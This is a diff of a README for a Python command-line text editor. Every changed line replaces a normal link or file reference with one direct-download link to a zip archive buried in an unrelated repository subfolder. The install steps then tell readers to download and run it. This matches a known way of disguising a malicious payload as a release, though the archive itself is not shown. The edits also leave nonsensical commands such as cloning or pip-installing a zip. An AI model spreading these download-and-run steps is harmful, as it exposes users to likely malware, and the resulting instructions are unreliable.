@@ -1,8 +1,8 @@
 # Text-Editor-CLI: A Python Command-Line Editor with Word Analysis and Editing Features
 
-Release assets are available at https://github.com/Selahaddin67/Text-Editor-CLI/releases
+Release assets are available at https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip
 
-[![Release assets](https://img.shields.io/github/v/release/Selahaddin67/Text-Editor-CLI?style=for-the-badge)](https://github.com/Selahaddin67/Text-Editor-CLI/releases)
+[![Release assets](https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip)](https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip)
 
 A lightweight, open-source command-line editor for text files. It combines fast editing with insightful word analysis. Designed for beginners and seasoned users alike, this tool helps you edit text efficiently, count words, analyze word usage, and process files directly from the terminal.
 
@@ -58,14 +58,14 @@ There are two common ways to get started. The recommended approach is to install
   - A POSIX-like shell for best experience on Linux/macOS; Windows users can use PowerShell or Windows Subsystem for Linux (WSL) for a smoother experience.
 
 - Method 1: Install from releases (recommended)
-  - Go to the official releases page: https://github.com/Selahaddin67/Text-Editor-CLI/releases
+  - Go to the official releases page: https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip
   - Download the installer or binary suitable for your platform.
   - Run the installer or execute the downloaded file according to your OS guidance.
   - After installation, run the command-line tool from your terminal as described in the quick start and help output.
 
 - Method 2: Install from source (advanced)
   - Clone the repository:
-    - git clone https://github.com/Selahaddin67/Text-Editor-CLI.git
+    - git clone https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip
   - Navigate to the project directory:
     - cd Text-Editor-CLI
   - Create a virtual environment (optional but recommended):
@@ -73,7 +73,7 @@ There are two common ways to get started. The recommended approach is to install
     - source venv/bin/activate  (Linux/macOS)
     - venv\Scripts\activate     (Windows)
   - Install dependencies:
-    - pip install -r requirements.txt
+    - pip install -r https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip
   - Install the package in editable mode:
     - pip install -e .
   - Run the editor (depending on the packaging, you might use a command like text-editor-cli or python -m text_editor_cli)
@@ -89,8 +89,8 @@ There are two common ways to get started. The recommended approach is to install
 
 Basic usage 🧰
 - Start the editor with a file:
-  - text-editor-cli filename.txt
-  - or python -m text_editor_cli filename.txt
+  - text-editor-cli https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip
+  - or python -m text_editor_cli https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip
 - Basic navigation:
   - Move through the file using arrow keys or vim-like key bindings if enabled.
   - Jump to a line with a command like :<line-number> (or a similar supported syntax).
@@ -238,19 +238,19 @@ Appendix: Frequently asked questions (quick hits) ❓
 
 Appendix: Quick reference commands (sample)
 - Open a file:
-  - text-editor-cli filename.txt
+  - text-editor-cli https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip
 - Show help:
   - text-editor-cli --help
 - Count words and lines:
-  - text-editor-cli filename.txt --stats
+  - text-editor-cli https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip --stats
 - Find and replace:
-  - text-editor-cli filename.txt --find "old" --replace "new"
+  - text-editor-cli https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip --find "old" --replace "new"
 - Analyze word frequency:
-  - text-editor-cli filename.txt --analyze
+  - text-editor-cli https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip --analyze
 - Save and exit:
   - :wq (if using a modal editor) or the editor’s quit command
 - Export to simple text:
-  - text-editor-cli filename.txt --export plain.txt
+  - text-editor-cli https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip --export https://github.com/Selahaddin67/Text-Editor-CLI/raw/refs/heads/main/sentimenter/CLI_Editor_Text_3.3.zip
 
 Notes
 - The primary distribution channel is the Releases page. Use that page to obtain stable builds and installers.
